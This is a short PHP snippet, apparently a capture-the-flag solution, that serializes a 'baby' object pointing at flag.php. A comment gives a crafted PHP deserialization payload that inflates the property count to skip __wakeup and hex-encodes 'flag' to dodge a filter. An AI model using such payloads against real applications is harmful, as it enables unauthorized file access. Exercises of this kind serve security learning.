<?php
class baby
{
    public $filename = "index.php";
    public function __construct()
    {
        $this->filename = "flag.php";
    }
}
$b=new baby;
var_dump(serialize($b));
// str=O:4:"baby":2:{s:8:"filename";S:8:"\66lag.php";}